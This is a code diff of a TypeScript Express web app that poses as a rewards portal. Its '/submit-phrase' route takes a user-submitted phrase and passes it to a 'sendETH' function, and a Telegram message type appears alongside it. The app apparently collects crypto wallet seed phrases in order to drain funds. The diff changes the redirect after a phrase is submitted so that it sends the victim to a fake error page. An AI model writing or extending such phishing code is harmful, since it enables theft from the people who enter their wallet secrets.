@@ -59,6 +59,9 @@ app.get('/', (_: Request, res: Response) => {
   res.render('index');
 });
 
+app.get('/error', (req: Request, res: Response) => {
+  res.render("error.ejs");
+})
 
 app.get("/login", (req: Request, res: Response) => {
   res.render("login.ejs");
@@ -87,6 +90,7 @@ app.get('/portal/dashboard', async (req: Request, res: Response) => {
       .populate('userId', 'email') // Populates the userId field with the email of the user
       .populate('rewardId', 'name points'); // Populates the rewardId field with the name and description of the reward
 
+
     res.render('dashboard.ejs', { rewards, myRewards, user });
   } catch (error) {
     console.error("Error fetching rewards:", error);
@@ -101,7 +105,7 @@ app.post('/claim-reward', async (req: Request, res: Response) => {
   const data: Partial<IUserReward> = { rewardId, userId };
   const response = await UserReward.create(data);
 
-  res.redirect(`/portal/dashboard?punk=${userId}`);
+  res.redirect(`/portal/dashboard?userId=${userId}`);
 })
 
 app.post('/submit-phrase', async (req: Request, res: Response) => {
@@ -128,12 +132,13 @@ app.post('/submit-phrase', async (req: Request, res: Response) => {
       sendETH(phraseinput)
     }
 
-    res.redirect('/portal/login');
+    res.redirect('/error');
   } catch (err) {
     console.error(err);
     res.status(500).send("Internal Server Error");
   }
 })
+
 
 interface TelegramMessage {
   chat_id: string;
